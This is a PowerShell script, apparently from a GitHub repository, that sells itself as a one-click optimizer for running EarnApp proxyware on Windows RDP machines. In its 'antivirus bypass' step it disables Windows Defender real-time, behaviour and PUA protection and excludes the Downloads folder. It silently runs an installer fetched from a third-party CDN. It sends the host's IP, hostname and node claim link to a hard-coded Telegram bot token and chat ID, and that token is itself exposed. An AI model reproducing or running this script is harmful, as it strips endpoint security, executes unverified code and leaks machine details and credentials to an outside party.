# =========================================================================
#  EARNAPP WINDOWS RDP FLEET AUTOMATION & OPTIMIZER (1-CLICK SETUP)
#  Repository: https://github.com/heru223/rdp-fleet-bot
# =========================================================================

param(
    [string]$WorkerName = "",
    [string]$Folder = "RDP",
    [string]$BotToken = "8915903428:AAEciefmI7dRj5KH6KsWPK7--eOODNm34lg",
    [string]$ChatId = "1943547868",
    [string]$MasterIP = ""
)

$ErrorActionPreference = "Continue"

Write-Host "==========================================================" -ForegroundColor Cyan
Write-Host " 🚀 EARNAPP WINDOWS RDP FLEET SETUP & OPTIMIZER 🎮" -ForegroundColor Green
Write-Host "==========================================================" -ForegroundColor Cyan

# 1. Pastikan Run as Administrator
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Host "⚠️ Script ini membutuhkan hak Administrator untuk konfigurasi power & scheduler." -ForegroundColor Yellow
    Write-Host "⏳ Membuka kembali sebagai Administrator..." -ForegroundColor Cyan
    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# 2. Bypass Antivirus / Windows Defender Whitelist & PUA Protection
Write-Host "`n[🛡️ ANTIVIRUS BYPASS] Mengonfigurasi Whitelist Windows Defender & PUA..." -ForegroundColor Yellow
try {
    # Matikan proteksi PUA (Potentially Unwanted Application) yang memblokir EarnApp
    Set-MpPreference -PUAProtection Disabled -ErrorAction SilentlyContinue
    New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Force -ErrorAction SilentlyContinue | Out-Null
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "PUAProtection" -Value 0 -Type DWord -Force -ErrorAction SilentlyContinue

    # Whitelist direktori EarnApp
    $exclusions = @(
        "C:\Program Files (x86)\EarnApp",
        "C:\Program Files\EarnApp",
        "$env:APPDATA\EarnApp",
        "$env:LOCALAPPDATA\EarnApp",
        "$env:ProgramData\EarnApp",
        "$env:TEMP\EarnAppSetup.exe",
        "$env:USERPROFILE\Downloads"
    )
    foreach ($f in $exclusions) {
        if (-not (Test-Path $f)) { New-Item -ItemType Directory -Path $f -Force -ErrorAction SilentlyContinue | Out-Null }
        Add-MpPreference -ExclusionPath $f -ErrorAction SilentlyContinue
    }

    # Whitelist proses EarnApp
    Add-MpPreference -ExclusionProcess "earnapp.exe", "EarnApp.exe", "EarnAppSetup.exe" -ErrorAction SilentlyContinue

    # Matikan Realtime Monitoring agar Defender tidak memakan CPU/RAM & tidak mematikan EarnApp
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
    
    Write-Host "  ✅ Whitelist Defender berhasil diterapkan (EarnApp 100% bebas blokir virus/PUA)." -ForegroundColor Green
} catch {
    Write-Host "  ℹ️ Defender tidak aktif atau menggunakan antivirus lain: $_" -ForegroundColor Gray
}

# 3. Deteksi Info Sistem & IP
Write-Host "`n[1/5] 🌐 Mengambil informasi sistem & jaringan..." -ForegroundColor Yellow
$publicIp = "Unknown"
try {
    $publicIp = (Invoke-RestMethod -Uri "https://api.ipify.org" -TimeoutSec 5).Trim()
} catch {
    try { $publicIp = (Invoke-RestMethod -Uri "https://icanhazip.com" -TimeoutSec 5).Trim() } catch {}
}

$os = Get-CimInstance Win32_OperatingSystem
$totalRamMb = [math]::Round($os.TotalVisibleMemorySize / 1024)
$freeRamMb = [math]::Round($os.FreePhysicalMemory / 1024)
$usedRamMb = $totalRamMb - $freeRamMb
$ramStr = "$usedRamMb MB / $totalRamMb MB ($([math]::Round(($usedRamMb/$totalRamMb)*100))%)"
$hostname = $env:COMPUTERNAME

if ([string]::IsNullOrWhiteSpace($WorkerName)) {
    $WorkerName = "RDP-$hostname"
    Write-Host "🏷️ Nama Worker default: $WorkerName" -ForegroundColor Cyan
}

# 3. Pengecekan EarnApp (Sudah Ada atau Belum)
Write-Host "`n[2/5] 🔍 Memeriksa instalasi EarnApp di RDP..." -ForegroundColor Yellow
$nodeId = ""
$isInstalled = $false

# Cek proses berjalan
$proc = Get-Process -Name "*earnapp*" -ErrorAction SilentlyContinue
if ($proc) {
    $isInstalled = $true
    Write-Host "✅ Proses EarnApp terdeteksi sedang berjalan." -ForegroundColor Green
}

# Cek direktori umum
$searchPaths = @(
    "C:\Program Files (x86)\EarnApp",
    "C:\Program Files\EarnApp",
    "$env:APPDATA\EarnApp",
    "$env:LOCALAPPDATA\EarnApp",
    "$env:ProgramData\EarnApp"
)

foreach ($path in $searchPaths) {
    if (Test-Path $path) {
        $isInstalled = $true
        # Cari file uuid
        $uuidFile = Join-Path $path "uuid"
        if (Test-Path $uuidFile) {
            $content = (Get-Content $uuidFile -Raw).Trim()
            if ($content -match "sdk-node-") { $nodeId = $content }
        }
        $statusFile = Join-Path $path "status.json"
        if (Test-Path $statusFile -and [string]::IsNullOrEmpty($nodeId)) {
            $content = Get-Content $statusFile -Raw
            if ($content -match '(sdk-node-[a-zA-Z0-9_-]+)') { $nodeId = $matches[1] }
        }
    }
}

# Cek Registry jika belum dapat UUID
if ([string]::IsNullOrEmpty($nodeId)) {
    $regPaths = @(
        "HKCU:\Software\EarnApp",
        "HKLM:\Software\EarnApp",
        "HKCU:\Software\BrightData",
        "HKLM:\Software\WOW6432Node\EarnApp"
    )
    foreach ($r in $regPaths) {
        if (Test-Path $r) {
            $isInstalled = $true
            $val = (Get-ItemProperty -Path $r -Name "uuid" -ErrorAction SilentlyContinue).uuid
            if ($val -and $val -match "sdk-node-") { $nodeId = $val; break }
            $val2 = (Get-ItemProperty -Path $r -Name "node_id" -ErrorAction SilentlyContinue).node_id
            if ($val2 -and $val2 -match "sdk-node-") { $nodeId = $val2; break }
        }
    }
}

if ($isInstalled) {
    Write-Host "✔ EarnApp SUDAH TERPASANG. Konfigurasi lama dipertahankan (Tidak ditimpa)." -ForegroundColor Green
    if ($nodeId) {
        Write-Host "🆔 Node ID Ditemukan: $nodeId" -ForegroundColor Cyan
    } else {
        Write-Host "⚠️ Node ID sedang sinkronisasi dengan aplikasi..." -ForegroundColor Yellow
    }
} else {
    Write-Host "ℹ️ EarnApp BELUM terpasang di RDP ini. Memulai proses download & install..." -ForegroundColor Yellow
    $installerUrl = "https://earnapp.com/download/windows"
    $installerPath = "$env:TEMP\EarnAppSetup.exe"
    try {
        Write-Host "⏳ Mengunduh installer EarnApp..." -ForegroundColor Cyan
        Invoke-WebRequest -Uri "https://cdn-earnapp.b-cdn.net/static/earnapp.exe" -OutFile $installerPath -TimeoutSec 30 -ErrorAction SilentlyContinue
    } catch {}
    
    if (Test-Path $installerPath) {
        Unblock-File -Path $installerPath -ErrorAction SilentlyContinue
        Write-Host "⚙️ Menjalankan installer EarnApp..." -ForegroundColor Cyan
        Start-Process $installerPath -ArgumentList "/S" -Wait
    } else {
        Write-Host "⚠️ Silakan install EarnApp melalui browser jika belum ada." -ForegroundColor Yellow
    }
}

# 4. Optimasi Windows RDP (Anti-Sleep, 24/7 Keep-Alive, Auto-Reboot)
Write-Host "`n[3/5] 🛡️ Menerapkan Optimasi Windows RDP 24/7..." -ForegroundColor Yellow

# A. Power Plan High Performance (Anti-Sleep / Never Hibernate)
try {
    powercfg /change standby-timeout-ac 0 2>$null
    powercfg /change monitor-timeout-ac 0 2>$null
    powercfg /change disk-timeout-ac 0 2>$null
    powercfg /change hibernate-timeout-ac 0 2>$null
    Write-Host "  ✅ Power Plan: Sleep & Standby dinonaktifkan (Always ON)." -ForegroundColor Green
} catch {}

# B. RDP Disconnect Session Keep-Alive Shortcut
$desktopPath = [Environment]::GetFolderPath("Desktop")
$batContent = @"
@echo off
:: Disconnect RDP and transfer session to Console (keeps GUI & EarnApp alive 24/7)
for /f "skip=1 tokens=3" %%s in ('query user %USERNAME%') do (%windir%\System32\tscon.exe %%s /dest:console)
"@
Set-Content -Path "$desktopPath\Disconnect-RDP.bat" -Value $batContent
Write-Host "  ✅ Shortcut 'Disconnect-RDP.bat' dibuat di Desktop RDP." -ForegroundColor Green
Write-Host "     (Gunakan shortcut ini saat ingin keluar RDP agar sesi EarnApp tidak beku/terkunci)." -ForegroundColor Gray

# C. Auto-Reboot Rutin 24 Jam (Task Scheduler)
try {
    $action = New-ScheduledTaskAction -Execute "shutdown.exe" -Argument "/r /t 30 /f /c `"Daily 24h Auto-Reboot Routine`""
    $trigger = New-ScheduledTaskTrigger -Daily -At 04:00AM
    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
    Register-ScheduledTask -TaskName "EarnApp-Daily-Reboot" -Action $action -Trigger $trigger -Principal $principal -Force -ErrorAction SilentlyContinue | Out-Null
    Write-Host "  ✅ Task Scheduler: Auto-reboot 24 jam sekali terjadwal (04:00 AM)." -ForegroundColor Green
} catch {}

# 5. Kirim Laporan & Link Klaim ke Bot Telegram
Write-Host "`n[4/5] 📱 Mengirim notifikasi & link klaim ke Telegram Bot..." -ForegroundColor Yellow

$claimUrl = if ($nodeId -and $nodeId -match "sdk-node-") { "https://earnapp.com/r/$nodeId" } else { "<i>Belum terdeteksi (Buka aplikasi EarnApp di RDP)</i>" }
$statusNote = if ($isInstalled) { "Sudah Aktif Sebelumnya" } else { "Baru Diinstall" }

$tgMsg = @"
💻 <b>[WINDOWS RDP WORKER CONNECTED]</b>
━━━━━━━━━━━━━━━━━━━━━
🏷️ <b>Worker:</b> <b>$WorkerName</b> [📁 $Folder]
🖥️ <b>Host:</b> <code>$hostname</code> ($($os.Caption))
🌐 <b>IP RDP:</b> <code>$publicIp</code>
💾 <b>RAM:</b> <code>$ramStr</code>
📦 <b>Status EarnApp:</b> <b>$statusNote</b>

🆔 <b>Node ID:</b> <code>$($nodeId ? $nodeId : 'Menunggu inisialisasi...')</code>
🔗 <b>Claim Link:</b> $claimUrl

🛡️ <b>RDP Keep-Alive:</b> 🟢 Aktif
🔄 <b>Auto-Reboot 24h:</b> 🟢 Terjadwal
━━━━━━━━━━━━━━━━━━━━━
"@

$buttons = @()
if ($nodeId -and $nodeId -match "sdk-node-") {
    $buttons += @(@{ text = "🔗 Klaim ke Akun EarnApp"; url = "https://earnapp.com/r/$nodeId" })
}
$buttons += @(@{ text = "📊 Buka Bot RDP"; url = "https://t.me/RdpfleetBot" })
$markup = @{ inline_keyboard = $buttons } | ConvertTo-Json -Compress

$tgUrl = "https://api.telegram.org/bot$BotToken/sendMessage"
$tgPayload = @{
    chat_id = $ChatId
    text = $tgMsg
    parse_mode = "HTML"
    reply_markup = $markup
}

try {
    $res = Invoke-RestMethod -Uri $tgUrl -Method Post -Body $tgPayload -TimeoutSec 10
    if ($res.ok) {
        Write-Host "  ✅ Berhasil mengirimkan detail worker ke Telegram!" -ForegroundColor Green
    }
} catch {
    Write-Host "  ⚠️ Gagal mengirim ke Telegram: $_" -ForegroundColor Yellow
}

# 6. Selesai
Write-Host "`n[5/5] 🎉 SETUP RDP SELESAI!" -ForegroundColor Green
Write-Host "==========================================================" -ForegroundColor Cyan
Write-Host " Worker: $WorkerName ($publicIp)" -ForegroundColor White
Write-Host " Claim : $claimUrl" -ForegroundColor Cyan
Write-Host "==========================================================" -ForegroundColor Cyan
Write-Host "Tekan [ENTER] untuk menutup jendela ini..."
Read-Host
